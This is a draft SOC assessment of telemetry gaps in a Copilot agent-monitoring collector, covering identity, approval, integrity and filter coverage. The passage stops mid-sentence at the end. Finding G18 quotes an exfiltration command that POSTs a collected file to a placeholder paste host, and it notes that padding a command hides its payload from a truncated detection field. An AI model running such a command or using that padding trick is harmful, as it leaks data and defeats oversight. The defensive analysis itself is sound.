# SOC Telemetry Requirements for GitHub Copilot — and Gaps in Glasseye Coverage

**Status:** Draft for review
**Date:** 2026-08-18
**Author:** @jrrbailey1
**Subject system:** `glasseye` OTel Collector (OCB v0.157.0) receiving OTLP from VS Code Copilot Chat

---

## Executive summary

**Bottom line.** Glasseye is a strong *action recorder* and a weak *attribution and assurance
system*. It captures what a Copilot agent did in more forensic detail than most commercial
tooling — complete shell commands, full file contents, tool results and user prompts. It cannot
currently establish **who did it**, **whether a human approved it**, or **whether the record can
be trusted**. Those three questions gate every incident response process, so in its present form
the feed supports investigation but not attribution or enforcement.

*(Revised 2026-08-19: an earlier draft also listed "on which repository". That was a test artefact
— the scratch workspace used for the capture was not a git repository. Copilot does emit
repository, branch, commit and organisation attributes in a git-backed workspace. See G8.)*

**What was assessed.** A live agent-mode session was driven from VS Code 1.123.0 with Copilot
v0.51.0 and captured end to end: 19 spans, 25 structured log events and 8 metric instruments over
one 431-second turn. All findings below are measured from that capture, not inferred from
documentation.

**Where coverage is genuinely good.** Every tool call is recorded with unredacted arguments and
results, including the verbatim terminal command and the full body of files the agent wrote. User
prompts, injected workspace context and system instructions are captured. The model's own
pre-execution risk verdict on shell commands is retained. Session, conversation and turn
identifiers correlate cleanly, and server-issued request IDs offer a join to GitHub's own records.

**The three critical gaps.**

| Gap | Effect on incident response |
|---|---|
| **No end-user or device identity** anywhere in the payload | An alert can be raised but not assigned. No isolation, no EDR pivot. The OS username appears only incidentally inside file paths, which is not attribution. |
| **Telemetry is user-disableable, unauthenticated and forgeable** | Off by default; any developer can silently opt out. The receiver accepts unauthenticated spans — during testing a hand-written synthetic span was ingested indistinguishably from real traffic. The feed is not currently evidence. |
| **Only traces reach the SOC** | The structured log events and all metrics terminate in a local file on the monitored user's own machine. The cleanest, most SIEM-ready part of the feed never leaves the endpoint. |

Alongside these, **no approval telemetry is emitted at all**. The capture proves a terminal command
was proposed and executed, but not whether a human authorised it or whether auto-approve was
active — the central control question for unsupervised agent action. This cannot be fixed in the
collector and needs raising with GitHub as a product requirement.

**Immediate actions, in order of value per unit of effort.**

1. **Route the logs pipeline to Pub/Sub.** A one-line config change that delivers the highest-value,
   lowest-volume portion of the feed to the SOC. Currently discarded to a local file.
2. **Restore attribution.** Copilot honours the standard `OTEL_RESOURCE_ATTRIBUTES` environment
   variable and merges it into every signal at source; a collector-side `resource` processor does
   the same locally with no rebuild. Both verified working. This gap is a configuration omission,
   not a product limitation — but the values must be injected by endpoint management, or they
   inherit the same user-controllability problem as gap 2 above.
3. **Move the collector off the monitored endpoint** and require authentication, so the record is
   not under the control of the person it observes.
4. **Add a redaction stage** before central export. With full content capture enabled, any secret in
   a file the agent reads is copied verbatim into the capture and published.

**Residual risk if unaddressed.** The pipeline provides useful operational visibility over
cooperative users, which covers accidental exposure and honest error. It does not currently
withstand the adversarial insider or compromised-account cases, and the capture store itself
aggregates source code and potentially credentials from every monitored developer — making it a
higher-value target than many of the systems it observes. It requires a named owner and an
access-control model before wider rollout.

---

## 1. Purpose

This document defines the telemetry a Security Operations Centre requires in order to **detect,
attribute, scope and respond to** security incidents arising from developer use of GitHub Copilot
(GHCP), and assesses how much of that requirement the current `glasseye` collector satisfies.

It is written against measured behaviour, not documentation. Every coverage claim below is
grounded in a live end-to-end capture.

## 2. Evidence base

A real Copilot agent-mode session was driven from VS Code and captured through glasseye.

| Item | Value |
|---|---|
| VS Code | 1.123.0 (`6a44c352bd`) |
| Copilot extension | bundled `copilot` v0.51.0 |
| Transport | OTLP/HTTP → `127.0.0.1:4318` |
| Copilot settings | `otel.enabled=true`, `exporterType=otlp-http`, `captureContent=true`, `maxAttributeSizeChars=0` |
| Session 1 | Agent turn in a **non-git** workspace: 19 spans, 25 log records, 8 metric instruments, ~1.2 MB over 431 s |
| Session 2 | Agent turn in a **git-backed** workspace: confirmed repository attributes; surfaced `embeddings` and `fetch_webpage` |
| Session 3 | Agent turn with the **built-in GitHub MCP server** enabled: confirmed MCP attribution |
| Models observed | `mai-code-1.1-flash`, `claude-haiku-4.5`, `gpt-4o-mini-2024-07-18`, `text-embedding-3-small-512`, `metis-1024-I16-Binary` |
| Idle volume | ~1 MB/hour/workstation of metrics with VS Code merely open |

Capture artefacts: `glasseye/agent-traffic.json` (unfiltered), `glasseye/agent-traffic-soc.json`
(post-`filter/soc`). Analysis helpers: `glasseye/flatten.ps1`, `glasseye/to-xlsx.ps1`.

### Scope and known limits of this assessment

Source inspection establishes how much of Copilot's telemetry these sessions actually exercised:

| Signal | Emitted by Copilot | Observed | Coverage |
|---|---|---|---|
| Span operation types | 5 | 5 | complete |
| Log event types | 10 | 4 | 40% |
| Metric instruments | 20 | 8 | 40% |

All findings here describe the **chat and agent surface**. Two further surfaces were not
exercised and are therefore **unassessed**, not assessed-and-cleared:

- **Inline completions / edit acceptance** — `inline.done`, `edit.hunk.action`, `edit.survival`,
  `edit.acceptance.count`, `lines_of_code.count`. Includes the metrics that measure how much
  AI-generated code entered the codebase and persisted, which is the code-provenance signal
  AppSec typically wants.
- **Cloud / pull-request agent** — `cloud.session.invoke`, `cloud.session.count`,
  `cloud.pr_ready.count`, `pull_request.count`. Autonomous server-side agent activity that raises
  pull requests. **Every control assumed in this document — approval prompts, model risk verdicts,
  endpoint collection on a managed device — presupposes a human at a keyboard and an IDE. Neither
  holds for this surface.** It is likely the highest-risk path and the least addressable by an
  endpoint collector.

Assessing those two surfaces should precede any rollout decision.

## 3. Threat model — what a GHCP incident actually looks like

Requirements are derived from these incident classes. Anything the telemetry cannot reconstruct
is a gap regardless of how much data volume it produces.

| # | Incident class | Illustrative scenario |
|---|---|---|
| T1 | **Source-code / IP exfiltration** | Proprietary code sent to the model as prompt context, deliberately or by workspace-wide context inclusion |
| T2 | **Secret leakage** | Agent reads `.env`, credentials or keys and includes them in model context, or writes them into a file/commit |
| T3 | **Destructive or unauthorised agent action** | Agent executes a shell command that deletes data, exfiltrates over the network, or changes infrastructure |
| T4 | **Prompt injection / hijack** | Malicious instructions embedded in a repo file, dependency, issue, or web page redirect the agent to attacker goals |
| T5 | **Supply-chain manipulation** | Agent adds a malicious dependency, edits CI/CD config, or weakens security controls in code |
| T6 | **Untrusted tool / MCP abuse** | A third-party MCP server or custom tool becomes an exfiltration channel |
| T7 | **Policy / control bypass** | Auto-approve enabled, telemetry disabled, unapproved model or BYOK endpoint used |
| T8 | **Insider misuse** | Agent used to access, aggregate or extract data beyond the user's authorisation |
| T9 | **Account / session compromise** | Stolen Copilot session used from an unexpected device or at anomalous volume |

## 4. Telemetry requirements

Organised by the questions a SOC must answer in sequence during an incident. **Priority** is the
consequence of *not* having the field: `P1` = incident cannot be actioned, `P2` = response is
materially degraded, `P3` = improves fidelity.

### 4.1 Attribution — *who did this, and from where?*

| ID | Requirement | Priority | Rationale |
|---|---|---|---|
| A1 | Authenticated end-user identity (GitHub login, email, or enterprise SSO subject) on every event | **P1** | Without it no incident can be assigned to a person. Every downstream response step depends on this. |
| A2 | Device identity (hostname, asset ID, OS user) | **P1** | Required to isolate the endpoint and pivot to EDR. |
| A3 | Organisation / enterprise / Copilot plan context | P2 | Determines which policy applies and who owns the response. |
| A4 | Source network address, as seen by an authority the user does not control | P2 | Geolocation and impossible-travel signals for T9. |
| A5 | Stable session and conversation identifiers, correlatable across signals | P2 | Reconstructs the full turn sequence. |

### 4.2 Locus — *what was in scope?*

| ID | Requirement | Priority | Rationale |
|---|---|---|---|
| L1 | Repository identity (remote URL, org/name) and branch | **P1** | Determines data classification and blast radius. A prompt containing public sample code is not an incident; the same prompt against a regulated repo is. |
| L2 | Workspace / folder path, and whether the repo is private, internal or public | P2 | Distinguishes sanctioned experimentation from production exposure. |
| L3 | Data classification or sensitivity label of the touched files | P3 | Enables risk-weighted triage rather than uniform alerting. |

### 4.3 Action record — *what did the agent do?*

| ID | Requirement | Priority | Rationale |
|---|---|---|---|
| C1 | Every tool invocation with complete, unredacted arguments | **P1** | The shell command or file path *is* the action under investigation (T3). |
| C2 | Tool results, including command stdout/stderr and exit status | **P1** | Establishes whether the action succeeded and what it returned. |
| C3 | Full content of file creations and a diff for edits | **P1** | Required to determine what was changed on disk (T5). |
| C4 | Terminal command text captured verbatim, pre-execution | **P1** | Pre-execution capture allows prevention, not just forensics. |
| C5 | Inventory of tools available to the agent, including MCP servers and custom tools | P2 | Establishes the capability envelope for T6. |
| C6 | Network egress initiated by the agent (fetches, API calls) | P2 | Direct exfiltration channel. |

### 4.4 Human control decisions — *was a human in the loop?*

| ID | Requirement | Priority | Rationale |
|---|---|---|---|
| H1 | Explicit approval / denial events for each gated action, with the deciding identity | **P1** | The single most important control signal. "Agent ran `rm -rf`" and "human reviewed and approved `rm -rf`" are different incidents with different responses. |
| H2 | Auto-approve / YOLO-mode state at time of execution | **P1** | Determines whether a human control existed at all (T7). |
| H3 | Latency between prompt and approval | P3 | Rubber-stamping detection — sub-second approvals of complex commands. |
| H4 | Model-generated risk assessment of the proposed action | P2 | Cheap pre-classification for triage. |

### 4.5 Data exposure — *what left the building?*

| ID | Requirement | Priority | Rationale |
|---|---|---|---|
| D1 | Prompt content, including injected editor/workspace context | **P1** | The exfiltration payload itself (T1). |
| D2 | File contents included in model context, with source paths | **P1** | Users are frequently unaware how much context is auto-attached. |
| D3 | Model, provider and endpoint destination | P2 | Detects unapproved models and BYOK/custom endpoints (T7). |
| D4 | Volume metrics (tokens, payload bytes) per user per period | P2 | Anomaly baseline for T1/T8 without reading content. |
| D5 | Secret/PII detection verdict over captured content | **P1** | Both a detection requirement (T2) and a control on the telemetry pipeline itself. |

### 4.6 Instruction provenance — *who was really giving the orders?*

| ID | Requirement | Priority | Rationale |
|---|---|---|---|
| I1 | Distinction between human-authored prompt and instructions derived from file/web/tool content | **P1** | The defining signal for prompt injection (T4). Without it, an injected instruction is indistinguishable from a user request. |
| I2 | Capture of instruction files in effect (`copilot-instructions.md`, `AGENTS.md`, chat modes) | P2 | Persistent injection vector, committed to the repo. |
| I3 | Provenance of tool results that re-entered model context | P2 | Identifies the injection carrier. |

### 4.7 Control-plane and configuration state

| ID | Requirement | Priority | Rationale |
|---|---|---|---|
| S1 | Extension version and relevant security settings at time of event | P2 | Establishes whether controls were configured as policy requires. |
| S2 | Change events when security-relevant settings are modified | **P1** | Disabling telemetry or enabling auto-approve is itself the alertable event (T7). |
| S3 | Registered MCP servers and their endpoints | P2 | Third-party code with tool access (T6). |

### 4.8 Evidentiary integrity — *can the SOC rely on this?*

| ID | Requirement | Priority | Rationale |
|---|---|---|---|
| E1 | Telemetry the monitored user cannot disable | **P1** | Opt-in, user-controlled telemetry provides assurance only for non-adversarial users — precisely the wrong population for T8/T9. |
| E2 | Authenticated, tamper-resistant transport and ingest | **P1** | An unauthenticated local endpoint accepts forged events, poisoning the evidence base. |
| E3 | Guaranteed delivery with buffering and replay across restarts | P2 | Silent loss is indistinguishable from silent absence of activity. |
| E4 | Gap detection — heartbeat / expected-agent inventory | **P1** | A SOC must be able to tell "no Copilot activity" from "telemetry stopped". |
| E5 | Accurate, synchronised timestamps and stable event ordering | P2 | Timeline reconstruction across correlated sources. |
| E6 | Correlation keys to GitHub-side audit logs and EDR | P2 | Independent corroboration when the endpoint feed is disputed. |

### 4.9 Operational fitness

| ID | Requirement | Priority | Rationale |
|---|---|---|---|
| O1 | Retention aligned to investigation windows, with rotation | P2 | Incidents are typically discovered weeks after the fact. |
| O2 | Access control and encryption over captured content | **P1** | The capture aggregates prompts, source code and possibly secrets — it is a higher-value target than the systems it monitors. |
| O3 | Predictable volume and cost | P3 | Uncontrolled attribute size makes central ingest unaffordable and causes silent truncation. |
| O4 | Latency compatible with the response objective | P2 | Post-hoc-only telemetry cannot support containment. |

---

## 5. Current coverage — what glasseye delivers today

Measured, and genuinely strong in the action and content dimensions.

### 5.1 Confirmed strengths

| Requirement | Evidence from capture |
|---|---|
| **C1, C4** Tool calls with full arguments | 6 × `execute_tool` spans. `run_in_terminal` carried the complete command string including interpreter path and working directory. |
| **C2** Tool results | `gen_ai.tool.call.result` present on all 6, including terminal stdout (`Glasseye E2E Sandbox`) and the tool's own note that it rewrote the command. |
| **C3** File write content | `create_file` captured the entire file body in `gen_ai.tool.call.arguments`. `github.copilot.tool.parameters.edit_type` distinguishes edit modes. |
| **C5** Tool inventory | `gen_ai.tool.definitions` enumerates every tool offered to the model (~60 KB) — **53 tools** in the observed session, including `run_in_terminal`, `fetch_webpage`, `open_browser_page`, `install_extension`, `install_python_packages`, `run_vscode_command`, `runSubagent`, `github_repo`, `github_text_search` and `session_store_sql`. Note the shell tool is not the only execution or egress path. |
| **C5, S3** MCP attribution | **Runtime-verified.** MCP tool calls carry `github.copilot.tool.parameters.mcp_server_name`, `.mcp_tool_name` and `.mcp_server_name_hash`, with full arguments and results. `gen_ai.tool.type` cleanly separates built-in (`function`) from MCP (`extension`) — a single-field detection for third-party tool use. These spans already pass `filter/soc`. |
| **D1, D2** Prompt content | `gen_ai.input.messages` up to 28 KB per span, containing the user prompt *plus* auto-injected editor context, open files and workspace state. `gen_ai.system_instructions` (163 KB total) captured. |
| **D3** Model and provider | `gen_ai.request.model` / `response.model` / `provider.name` on every inference. Two distinct models observed (`mai-code-1.1-flash`, `gpt-4o-mini-2024-07-18`). |
| **D4** Volume metrics | `gen_ai.usage.input_tokens` / `output_tokens` / `cache_read.input_tokens` per call; 8 metric instruments including `gen_ai.client.token.usage`. |
| **H4** Risk assessment | `copilotLanguageModelWrapper` spans contain the model's pre-execution verdict on terminal commands, e.g. `{"risk":"green","explanation":"Changes directory and executes hello.py."}` — exactly as the README claims. |
| **A5** Session correlation | `session.id`, `copilot_chat.chat_session_id`, `gen_ai.conversation.id`, `turn.index`, `copilot_chat.turn_count`, plus W3C trace/span/parent IDs. All 13 core spans shared one trace. |
| **Inventory completeness** | Source inspection confirms the exporter filters against a fixed allow-set of exactly five operation types — `chat`, `invoke_agent`, `execute_tool`, `embeddings`, `execute_hook`. The signal catalogue is therefore **exhaustive by construction**, not merely by observation. Note spans carrying *no* operation name pass the filter unconditionally. |
| **E6** GitHub-side correlation | `copilot_chat.server_request_id` and `gen_ai.response.id` are server-issued and should join to GitHub's own records. |
| **I3 (partial)** Injection carrier visible | Tool results are captured, so content that re-entered model context is at least *present* in the log, even if unlabelled. |

### 5.2 Signal inventory observed

- **Traces** — 19 spans: `invoke_agent` (1), `chat` (12), `execute_tool` (6).
- **Logs** — 25 structured events, the cleanest event stream in the feed:
  `copilot_chat.session.start`, `copilot_chat.agent.turn` (×6, with `turn.index`),
  `copilot_chat.tool.call` (×6, with `success` and `duration_ms`),
  `gen_ai.client.inference.operation.details` (×12).
- **Metrics** — 8 instruments: agent invocation duration, turn count, session count,
  time-to-first-token, tool call count/duration, client operation duration, token usage.

---

## 6. Gap analysis

Severity reflects impact on incident response, not implementation difficulty.

### G1 — No end-user identity anywhere in the payload — **CRITICAL** *(A1)*

Exhaustive search of all resource, span, log and metric attributes returned **no identity field**.
The complete resource attribute set is:

```
service.name    = copilot-chat
service.version = 0.51.0
session.id      = 3aaf37d1-…            (VS Code instance, not a person)
client.address  = 127.0.0.1             (added by glasseye, not by Copilot)
```

There is no GitHub login, email, enterprise subject, `enduser.id` or `user.name`. The OS username
appears 152 times in the payload — but only incidentally, inside Windows file paths such as
`c:\Users\jrrba\...` in tool arguments. Parsing identity out of file paths is not attribution: it
breaks on network drives, containers, WSL and any non-default workspace location, and is trivially
avoidable by a motivated insider.

**Consequence:** an alert can be raised, but not assigned. Every P1 requirement downstream of
attribution is blocked.

**Remediable.** Copilot emits no identity of its own, but it *does* honour the standard
`OTEL_RESOURCE_ATTRIBUTES` environment variable and merges it into the resource block at source.
A collector-side `resource` processor achieves the same locally without a rebuild. Both are
verified working — see Recommendation 1. This gap is a configuration omission, not a product
limitation.

### G2 — No device or host identity — **CRITICAL** *(A2)*

No `host.name`, `host.id`, `os.type` or device identifier. `client.address` is always `127.0.0.1`
because the collector runs on the same machine as the editor, so it carries zero attribution value
in the current topology. The SOC cannot isolate an endpoint or pivot to EDR.

### G3 — Telemetry is user-controlled, unauthenticated and forgeable — **CRITICAL** *(E1, E2)*

Three compounding weaknesses:

1. `github.copilot.chat.otel.enabled` is an ordinary user setting. Any developer can set it to
   `false`, reload, and disappear from the feed. It is also off by default.
2. The OTLP receiver listens on `0.0.0.0:4318` in `config.yaml` with no authentication. Any local
   process — or anything on the network, given the `0.0.0.0` bind — can POST arbitrary spans.
   This was demonstrated during testing: a hand-written synthetic span was accepted and written to
   the capture indistinguishably from genuine Copilot traffic.
3. There is no signing or hash-chaining, so records cannot be shown to be unaltered.

**Consequence:** the feed is fit for operational visibility over cooperative users. It is not
currently evidence, and it cannot be relied upon against the adversarial insider cases (T8, T9).

### G4 — No approval or denial telemetry — **HIGH** *(H1, H2)*

Searching the entire payload for `approv`, `consent`, `autoApprove` returned **zero** matches;
`confirm`, `reject` and `denied` appear only inside prompt and tool-definition prose.

The capture shows a terminal command was *proposed* and *executed*, and includes the model's risk
verdict — but contains no record of the human approving it, and no record of whether auto-approve
was enabled. The SOC therefore cannot distinguish a reviewed action from an unsupervised one,
which is the central control question for T3 and T7.

**Qualification (2026-08-19) — a hook-based enforcement point exists, and it is code-verified.**

Copilot implements a hooks mechanism with its own span type and a genuine *enforced* decision —
not the advisory model verdict of §5.1. The emission path:

```js
startSpan(`execute_hook ${event}`, { attributes: {
  OPERATION_NAME: "execute_hook", HOOK_TYPE: event,
  "copilot_chat.hook_command": hook.command,
  HOOK_TOOL_NAMES: JSON.stringify([tool_name]) }})
setAttribute(HOOK_INPUT, ...)            // full hook stdin payload
...
let d = outcome==="success" ? "pass" : exit_code===2 ? "block" : "non_blocking_error";
setAttribute(HOOK_DECISION, d)           // github.copilot.hook.decision
setAttribute("copilot_chat.hook_exit_code", exit_code)
setAttribute("copilot_chat.hook_output",  output)
```

**A `PreToolUse` hook exiting 2 blocks the tool call and records `decision=block`.** That is a
policy decision, enforced and logged — the closest thing in the product to the control H1 and H2
require. 27 hook events are defined, including `PermissionRequest` and `PermissionDenied`.

**Two limitations found by testing:**

1. **Not wired into standard agent mode.** A capture with `SessionStart`, `PreToolUse` and
   `PostToolUse` hooks configured in the workspace produced three tool calls
   (`list_dir`, `read_file`, `manage_todo_list`) and **zero hook attributes**. The agent was
   `github.copilot.agent.type = builtin` on `mai-code-1.1-flash`. The emission code sits in
   `ClaudeMessageDispatch` alongside the bundled Claude Code CLI, so hook coverage appears scoped
   to the Claude / Copilot CLI agent path, not the default agent developers actually use.
2. **Not runtime-verifiable on this account.** The test account is on **Copilot Free**, which does
   not offer the agent picker needed to reach that path. Hooks could not be exercised at all.

**Status:** G4 remains **HIGH** and unproven in either direction. Hooks are a credible route to
closing it, but before relying on them, confirm on a Business/Enterprise seat that (a) the
Claude/CLI agent is available, (b) hooks fire there, and critically (c) whether the *default*
agent gains hook coverage. If enforcement only covers a non-default agent path, the control is
of little practical use.

**Note also:** `execute_hook` is a fifth `gen_ai.operation.name` value and matches none of the four
whitelisted in `filter/soc` — so even where hooks do fire, the decisions would be **dropped before
reaching the SOC**, exactly as with `embeddings` (G15).

### G5 — Only traces reach the SOC; logs and metrics never leave the endpoint — **HIGH** *(E3, and all of §4)*

In `config.yaml`, the `googlecloudpubsub` exporter appears in exactly one pipeline:

```yaml
traces/pubsub:  [otlp] → resource → filter/soc → batch → googlecloudpubsub
metrics:        [otlp] → resource → batch → debug, file      # local only
logs:           [otlp] → resource → batch → debug, file      # local only
```

The 25 structured log events — `session.start`, `agent.turn`, `tool.call` with success and
duration — are the most SIEM-ready part of the entire feed, and they terminate in a local file on
the monitored user's own machine. So do all 8 metric instruments, which are the natural basis for
the volumetric baselining required by D4.

### G6 — The SOC filter discards the agent's reasoning turns — **HIGH** *(D1, I1)*

`filter/soc` passed 10 of 19 spans. Correctly dropped: `progressMessages`, `title`. Incorrectly
dropped: **6 × `chat` spans with `gen_ai.agent.name = panel/editAgent`** — the actual agent-loop
LLM turns, sharing the same trace and parent as the retained `invoke_agent` span.

These spans carry the per-turn prompt (with injected workspace context) and the model's reasoning
output. The whitelist in `config.yaml:44` admits `invoke_agent`, `execute_tool`,
`copilotLanguageModelWrapper` and `InlineChat2Intent`; agent-mode chat turns match none.

Partial mitigation: the retained `invoke_agent` span does carry the top-level user request and the
final answer, so the feed is not blind to the prompt. What is lost is the reasoning chain — how the
agent got from request to action, which is precisely what an injection investigation requires.

### G7 — No instruction provenance — **HIGH** *(I1, I2)*

Prompt text and tool results are both captured, but nothing marks which instructions originated
from the human versus from file content, web fetches or tool output. Instruction files in effect
(`copilot-instructions.md`, `AGENTS.md`, chat modes) are not separately identified.

An injected instruction inside a README the agent read is present in the capture, but appears as
ordinary context. Detection would require content analysis of the whole prompt rather than a
structured signal.

### G8 — Repository attribution absent in this capture, but supported — **LOW (test artefact)** *(L1, L2)*

**This finding has been corrected.** The original assessment recorded no repository, branch or
organisation attribute anywhere in the capture, and rated the gap HIGH. That absence was an
artefact of the test method, not a product limitation.

Inspection of extension v0.51.0 shows these attributes are implemented and populated from the
VS Code Git extension's active repository:

```js
n.headBranchName && (e[GIT_BRANCH]     = n.headBranchName)
n.headCommitHash && (e[GIT_COMMIT_SHA] = n.headCommitHash)
n.remoteUrl      && (e[GIT_REPOSITORY] = n.remoteUrl,
                     e[GITHUB_ORG]     = /github\.com[/:]([^/]+)\//.exec(n.remoteUrl)[1])
```

yielding `github.copilot.git.repository`, `github.copilot.git.branch`,
`github.copilot.git.commit_sha`, `github.copilot.github.org`, plus the `copilot_chat.repo.*`
equivalents and `copilot_chat.file.relative_path`.

The test session ran in a scratch folder (`copilot-e2e-sandbox`) that was **not** a git
repository, so `activeRepository` was undefined and every one of these attributes was silently
omitted. Requirements L1 and L2 are therefore substantially met in any real, git-backed workspace.

**Residual risk, downgraded to LOW:** attribution degrades silently to nothing outside a git
workspace, with no marker distinguishing "not a repo" from "attribute missing". Repository
*visibility* (private/internal/public) is still not emitted, so data classification must be
resolved by joining `github.copilot.git.repository` to your own repository inventory.

**Runtime-verified 2026-08-19.** A second capture in a git-backed workspace produced them exactly
as predicted:

```
github.copilot.git.repository = https://github.com/jrrbailey1/copilot-e2e-sandbox.git
github.copilot.git.branch     = master
github.copilot.git.commit_sha = 1f21a83cc8de914e1ebed72291cfc2f73f708e28
github.copilot.github.org     = jrrbailey1
```

**One design consequence:** these attributes appear on the **`invoke_agent` span only** — once per
turn, on the trace root. No `execute_tool`, `chat` or `embeddings` span carries them, so a
tool-level alert arrives without repository context and must be enriched by joining to the parent
span via `traceId`. Build that join into the pipeline.

### G9 — No secret detection or redaction, and the capture is itself a target — **HIGH** *(D5, O2)*

With `captureContent=true` the pipeline records full prompts, complete file contents and command
output. Any secret in a file the agent reads is copied verbatim into `agent-traffic.json` and
published to Pub/Sub. There is no detection verdict, no redaction stage and no field-level
encryption.

The monitoring pipeline therefore aggregates, in one place, the source code and potentially the
credentials of every monitored developer — a higher-value target than most of the systems it
observes. This needs an explicit control owner, not just a `.gitignore` entry.

### G10 — Detection latency — **MEDIUM** *(O4)*

`invoke_agent` closes only at end of turn: **431 seconds** in a single observed session, with one
tool call alone taking 344 s. Anything alerting on the prompt via `invoke_agent` lags the entire
turn, by which time all actions have executed. `execute_tool` spans arrive promptly and are the
correct basis for near-real-time detection — but see G5 regarding the log events.

### G11 — No delivery assurance or gap detection — **MEDIUM/HIGH** *(E3, E4)*

No `sending_queue`, no persistent storage extension, no retry configuration. If the collector is
down or Pub/Sub credentials are absent, data is dropped — the README acknowledges the exporter
"silently drops messages" without `GOOGLE_APPLICATION_CREDENTIALS`. There is no heartbeat, so the
SOC cannot distinguish an idle developer from a disabled agent.

### G12 — Unbounded and unmanaged volume — **MEDIUM** *(O1, O3)*

`gen_ai.tool.definitions` accounted for 426 KB of a 1.2 MB capture — a ~60 KB static schema blob
repeated on every tool span. `gen_ai.system_instructions` added 163 KB. Together, **76% of all span
content is static text repeated per event** (589 KB of 775 KB measured). `invoke_agent` is the
extreme case: 60,830 of its 61,487 characters are tool definitions, delivering 657 characters of
actual content. `maxAttributeSizeChars=0` disables truncation entirely, and the file exporter has
no rotation configured.

**Idle volume is the bigger scaling factor.** Measured over 20.1 hours with VS Code merely open and
no Copilot use, the capture grew to 20 MB — 2,211 of its 2,213 documents were metric exports, which
fire every ~10 seconds unconditionally. That is **~1 MB/hour/workstation, roughly 24 MB per
developer per day, before a single prompt is typed**. For a 500-developer estate that is ~12 GB/day
of idle telemetry arriving at a central collector. Size the gateway and the retention budget
against idle traffic, not against session traffic.

**Operational note:** the file exporter **truncates rather than appends on collector restart**.
A restart destroys the local capture, which is a concrete instance of the G11 delivery-assurance
gap rather than a separate issue.

Note the tension with C5: the tool definitions have genuine security value as a capability
inventory. The fix is to emit them once per session, not to drop them.

### G13 — ~~No agent network egress record~~ — **SUPERSEDED by G16**

*Withdrawn 2026-08-19.* This gap originally stated that agent-initiated network activity is not
visible. That was wrong: the `execute_tool` / `fetch_webpage` span records outbound fetches with
the full URL. See **G16** for the corrected and narrowed finding.

The part that survives: the **model endpoint** itself is still not recorded beyond
`gen_ai.provider.name`, so BYOK and custom-endpoint detection (T7) still depends on
network-layer telemetry this pipeline does not provide.

### G14 — No configuration-change events — **MEDIUM** *(S1, S2)*

Extension version is captured (`service.version = 0.51.0`), but there is no event when a
security-relevant setting changes. Disabling telemetry produces silence, not an alert — which is
the same failure mode as G3 and G11 seen from a different angle.

---

### G15 — Workspace indexing is invisible to the SOC — **HIGH** *(D1, D2)*

*Added 2026-08-19 from the second capture.*

Copilot emits a fourth operation type not seen in the first session: **`embeddings`**. Workspace
content is chunked and sent to an embedding model for semantic search and indexing — one observed
call carried **30 chunks** in a single request, with `gen_ai.provider.name = openai` rather than
`github`.

```
embeddings text-embedding-3-small-512   gen_ai.embeddings.input_count = 30   provider = openai
embeddings metis-1024-I16-Binary        gen_ai.embeddings.input_count = 1    provider = openai
```

This is a data-egress path with **no other record anywhere in the telemetry**: no tool call, no
prompt, no user action. It happens as a side effect of having a workspace open.

**All `embeddings` spans are dropped by `filter/soc`** — they match none of the four whitelisted
values, so this path is entirely invisible to the SOC. That is a separate defect from G6 and needs
its own fix.

**Mitigating factor:** the spans record `input_count` only, never the content, so they carry no
content risk themselves. `gen_ai.embeddings.input_count` is a usable bulk-exposure volumetric
signal requiring no content access — but it bounds exposure by volume only, and cannot tell you
which files were sent.

### G16 — Agent network egress is captured, but only via one tool — **MEDIUM** *(C6)*

*Added 2026-08-19; partially supersedes G13.*

G13 stated that agent-initiated network activity is not visible. That is too strong. The
`execute_tool` / `fetch_webpage` span captures outbound fetches with the **full URL** in clean
JSON:

```
gen_ai.tool.call.arguments = {"urls":["https://raw.githubusercontent.com/jrrbailey1/kobayashi-maru/main/README.md"],
                              "query":"README content summary"}
```

**The behaviour this revealed matters more than the gap.** Asked to read a file from a GitHub
repository, the agent did not clone it and did not use a GitHub API tool — it fetched
`raw.githubusercontent.com` directly. Repository content entered model context with **nothing
written to disk**: no directory for EDR, no file for DLP. This span is the only record.

A detection built around `run_in_terminal` and `git clone` would miss this case completely.
`fetch_webpage` is the primary agent egress channel and should be treated as a first-class
detection surface.

**Residual gap:** the model endpoint itself is still not recorded beyond
`gen_ai.provider.name`, and other tools with network reach (`open_browser_page`, `github_repo`,
`github_text_search`, `install_extension`, `install_python_packages`) were not exercised.

### G17 — `mcp_server_name_hash` is not a redaction — **LOW** *(O2, D5)*

*Added 2026-08-19 from the third capture.*

`github.copilot.tool.parameters.mcp_server_name_hash` is an **unsalted, single-iteration SHA-256**
of the server name. Verified directly: `sha256("github")` reproduces the observed value
`c0b0109d9439de57fe3cf03abeccbc52f4c98170c732d3b69af5e6395ace574e` exactly.

Any MCP server with a guessable name — `github`, `slack`, `jira`, `postgres`, or an internal
hostname — is recoverable by dictionary attack in milliseconds. The risk is not the hash itself
but the reasonable assumption that a field named `_hash` is the privacy-safe variant to retain
when redacting. It is not. Retain it as a stable correlation key; treat it as equivalent to
plaintext for disclosure purposes.

### G18 — The convenient command field is silently truncated and evadable — **MEDIUM** *(C1, C4)*

*Added 2026-08-19 from source inspection.*

Copilot lifts shell commands into a flat, indexed attribute
`github.copilot.tool.parameters.command` — the natural field to build detections on. It is capped
at **256 characters** by a raw slice:

```js
if (shellTools.has(toolName)) {
  let s = pick(input, ["command","cmd","commandLine"]);
  s && (attrs[TOOL_PARAM_COMMAND] = s.length > 256 ? s.slice(0, 256) : s);
}
```

Three properties make this a trap rather than a documented limit:

1. **Silent.** Unlike content attributes, which append `...[truncated, original N chars]`, this is
   a bare substring. The field looks like a complete, well-formed command.
2. **Ignores configuration.** `maxAttributeSizeChars: 0` disables truncation for content
   attributes; this cap is hard-coded and unaffected. Operators will reasonably believe truncation
   is off.
3. **Cuts where the payload lives.** Shell commands build left to right, so destinations and
   redirects sit at the end. Worked example — a 325-character exfiltration command:

```
kept    : …| Out-File .\collected.txt; Invoke-WebRequest -Uri h
dropped : ttps://paste.example.com/upload -Method POST -InFile .\collected.txt"
```

A rule for `Invoke-WebRequest` fires; a rule for the destination host `paste.example.com` silently
misses — and the destination is what tells you where the data went.

**It is also evadable.** Anyone aware of the limit can pad 256 characters of innocuous prefix and
push the entire payload out of the indexed field.

**Not a data-loss defect.** The full command remains in `gen_ai.tool.call.arguments`, uncapped. The
risk is solely that the convenient field and the authoritative field disagree with no marker.

**Compounding issue: flat attributes exist for only some tools.** `tool.parameters.command` is
populated for six shell tool names, and `file_path` / `edit_type` for 22 read/edit tool names.
**Every other tool gets no flat attribute** — including `fetch_webpage`, `github_repo`,
`install_extension`, `run_vscode_command`, `create_and_run_task` and `runSubagent`. Several of the
